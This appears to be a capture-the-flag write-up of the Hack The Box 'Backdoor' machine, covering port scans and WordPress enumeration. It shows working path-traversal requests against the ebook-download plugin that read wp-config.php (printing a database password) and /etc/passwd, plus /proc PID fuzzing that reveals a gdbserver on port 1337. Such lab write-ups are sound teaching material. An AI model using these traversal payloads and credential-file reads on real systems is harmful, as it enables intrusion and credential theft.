
# Enumeration

### NMAP

 ```console
 noob2uub@kali:~$ nmap -sV -sC -A T4 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 11:23 PDT
Failed to resolve "T4".
Nmap scan report for 10.10.11.125
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.91 seconds
noob2uub@kali:~$ cd Documents/
```
# Word Press Site

![Screenshot_2022-04-07_11-25-07](https://user-images.githubusercontent.com/68706090/162272121-77a8a86b-310f-4fd2-8ef6-c547a1016ae3.png)

Nothing to really look at on the site so I will start a GOBUSTER directory scan. 

# GOBUSTER

```console
noob2uub@kali:~/Documents/HTB/backdoor$ gobuster dir -u http://10.10.11.125 -w /home/noob2uub/Documents/Wordlists/common.txt -x php,html,txt                         
===============================================================                                                                                                      
Gobuster v3.1.0                                                                                                                                                      
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                        
===============================================================                                                                                                      
[+] Url:                     http://10.10.11.125                                                                                                                     
[+] Method:                  GET                                                                                                                                     
[+] Threads:                 10                                                                                                                                      
[+] Wordlist:                /home/noob2uub/Documents/Wordlists/common.txt                                                                                           
[+] Negative Status codes:   404                                                                                                                                     
[+] User Agent:              gobuster/3.1.0                                                                                                                          
[+] Extensions:              php,html,txt                                                                                                                            
[+] Timeout:                 10s
===============================================================
2022/04/07 11:28:52 Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.11.125/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.11.125/]
/license.txt          (Status: 200) [Size: 19915]                       
/readme.html          (Status: 200) [Size: 7346]                        
/server-status        (Status: 403) [Size: 277]                         
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.11.125/wp-admin/]
/wp-blog-header.php   (Status: 200) [Size: 0]                                      
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.11.125/wp-content/]
/wp-config.php        (Status: 200) [Size: 0]                                        
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.11.125/wp-includes/]
/wp-load.php          (Status: 200) [Size: 0]                                         
/wp-cron.php          (Status: 200) [Size: 0]                                         
/wp-login.php         (Status: 200) [Size: 5674]                                      
/wp-links-opml.php    (Status: 200) [Size: 223]                                       
/wp-mail.php          (Status: 403) [Size: 2616]                                      
/wp-signup.php        (Status: 302) [Size: 0] [--> http://10.10.11.125/wp-login.php?action=register]
/wp-trackback.php     (Status: 200) [Size: 135]                                                     
/wp-settings.php      (Status: 500) [Size: 0]                                                       
/xmlrpc.php           (Status: 405) [Size: 42]                                                      
/xmlrpc.php           (Status: 405) [Size: 42]                                                      
                                                                                                    
===============================================================
2022/04/07 11:30:05 Finished
===============================================================
```

I found a few interesteding things to look at. Lets start digging around. 

### WP-Login

When I attempted to just put a random user name in it, tell me that its an invalid user name. 

![Screenshot_2022-04-07_11-32-01](https://user-images.githubusercontent.com/68706090/162272780-8bb7a98c-3b4a-4302-bd08-960807e9d616.png)

However, if I use Admin, it just tells me that I have an invalid password. Lets keep looking at what else we can do, but perhaps we can run hydra on this.

![Screenshot_2022-04-07_11-32-19](https://user-images.githubusercontent.com/68706090/162272832-c742a13b-ec55-4da8-9839-c867d4baa823.png)


### WP-Includes

If I can get into the site I can use this to perhaps launch a reverse shell. 

![Screenshot_2022-04-07_11-43-31](https://user-images.githubusercontent.com/68706090/162274546-eb0b073c-a5a6-483f-9f3a-6cad123d2989.png)

After messing around with this some time, I decided to further enumare WP

### What WEB

```console
noob2uub@kali:~/Documents/HTB/backdoor$ whatweb 10.10.11.125
http://10.10.11.125 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
```

We find that it is running word press 5.8.1

### SEARCHSPLOIT

```console
noob2uub@kali:~$ searchsploit wordpress 5.8.1
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                          | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                        | php/webapps/48918.sh
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

This site is not running any of these pluging so lets continue to enumerate. 

### NUCLEI

Lets further enumerate the WP site

```Console
noob2uub@kali:~$ nuclei -u http://10.10.11.125

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   2.6.5

                projectdiscovery.io

[WRN] Use with caution. You are responsible for your actions.
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[INF] Using Nuclei Engine 2.6.5 (latest)
[INF] Using Nuclei Templates 8.9.4 (latest)
[INF] Templates added in last update: 20
[INF] Templates loaded for scan: 3120
[INF] Templates clustered: 530 (Reduced 487 HTTP Requests)
[2022-04-07 13:03:10] [addeventlistener-detect] [http] [info] http://10.10.11.125
[2022-04-07 13:03:10] [wordpress-detect] [http] [info] http://10.10.11.125 [5.8.1]
[2022-04-07 13:03:10] [apache-detect] [http] [info] http://10.10.11.125 [Apache/2.4.41 (Ubuntu)]
[2022-04-07 13:03:10] [email-extractor] [http] [info] http://10.10.11.125 [wordpress@example.com]
[2022-04-07 13:03:10] [tech-detect:google-font-api] [http] [info] http://10.10.11.125
[INF] Using Interactsh Server: oast.me
[2022-04-07 13:03:13] [metatag-cms] [http] [info] http://10.10.11.125 [WordPress 5.8.1]
[2022-04-07 13:03:14] [http-missing-security-headers:content-security-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:permission-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:x-frame-options] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-expose-headers] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-allow-methods] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-allow-credentials] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:strict-transport-security] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:x-content-type-options] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:referrer-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:clear-site-data] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-allow-origin] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-max-age] [http] [info] http://10.10.11.125
[2022-04-07 13:03:19] [CVE-2016-10924] [http] [high] http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
[2022-04-07 13:03:20] [waf-detect:apachegeneric] [http] [info] http://10.10.11.125/
[2022-04-07 13:03:20] [waf-detect:ats] [http] [info] http://10.10.11.125/
[2022-04-07 13:03:24] [host-header-injection] [http] [info] http://10.10.11.125
[2022-04-07 13:03:26] [CVE-2017-5487] [http] [medium] http://10.10.11.125/?rest_route=/wp/v2/users/ [admin]
[2022-04-07 13:03:27] [wordpress-login] [http] [info] http://10.10.11.125/wp-login.php
[2022-04-07 13:03:34] [wordpress-directory-listing] [http] [info] http://10.10.11.125/wp-content/uploads/
[2022-04-07 13:03:34] [wordpress-directory-listing] [http] [info] http://10.10.11.125/wp-content/plugins/
[2022-04-07 13:03:34] [wordpress-directory-listing] [http] [info] http://10.10.11.125/wp-includes/
[2022-04-07 13:03:35] [wordpress-xmlrpc-file] [http] [info] http://10.10.11.125/xmlrpc.php
```

We have one High vulnerbility, so lets take a look at that. 

Downloading the file provides us with SQLDB Credentials, but they don't seem to work when I go to login. Now that I know that a directory traversal is possible lets see about etc/passwd

```console

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```
Navigating to: http://wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd

```console
../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
<script>window.close()</script>
```
I can see that we have a user name of user, but I can't seem to find anything. I spent about an hour doing more research feeling like I was missing thing something very important. So I decided to reset the box and enumerate further. I found another port open by forcing it to scan all ports.

### NMAP 

```console
noob2uub@kali:~/Documents/Tools$ sudo nmap -sC -sV -p1-65535 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 14:17 PDT
Nmap scan report for 10.10.11.125
Host is up (0.038s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.62 seconds
noob2uub@kali:~/Documents/Tools$ 
```

I found port 1337, lets look into this. I can't find anything on this except waste means "elite" I spent more time researching LFI and found this resource that had me look into the PID.

https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html

So lets use WFUZZ to find out what PIDS I can get. 

### WFUZZ

```console
noob2uub@kali:~/Documents/Tools$ wfuzz -u http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline
Total requests: 1000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                             
=====================================================================

000000861:   200        0 L      8 W        138 Ch      "861"                                                                                               
000000858:   200        0 L      11 W       181 Ch      "858"                                                                                               
000000852:   200        0 L      12 W       183 Ch      "852"                                                                                               
000000902:   200        0 L      3 W        128 Ch      "902"                                                                                               

Total time: 0
Processed Requests: 1000
Filtered Requests: 996
Requests/sec.: 0
```
so now lets check out those four PID's

```console
noob2uub@kali:~/Documents/Tools$ cat test.txt
/proc/902/cmdline/proc/902/cmdline/proc/902/cmdline/sbin/agetty-o-p -- \u--nocleartty1linux<script>window.close()</script>noob2uub@kali:~/Documents/Tools$ cat test.turl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/852/cmdline --output test.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   183  100   183    0     0   2380      0 --:--:-- --:--:-- --:--:--  2376
noob2uub@kali:~/Documents/Tools$ cat test.txt
/proc/852/cmdline/proc/852/cmdline/proc/852/cmdline/bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done<script>window.close()</script>noob2uub@kali:~/Documents/Tools$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/852/cmdline --outpu                                 url http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/858/cmdline --output test.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   181  100   181    0     0   2354      0 --:--:-- --:--:-- --:--:--  2381
noob2uub@kali:~/Documents/Tools$ cat test.txt
/proc/858/cmdline/proc/858/cmdline/proc/858/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()</script>noob2uub@kali:~/Documurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/861/cmdline --output test.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   138  100   138    0     0   1803      0 --:--:-- --:--:-- --:--:--  1815
noob2uub@kali:~/Documents/Tools$ cat test.txt
/proc/861/cmdline/proc/861/cmdline/proc/861/cmdlinesshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups<script>window.close()</script>noob2uub@kali:~/Documents/Tools$                                                                                                        
```

I see something interested. User is running gdbserver on port 1337. This was the headache port until I reset the box. 









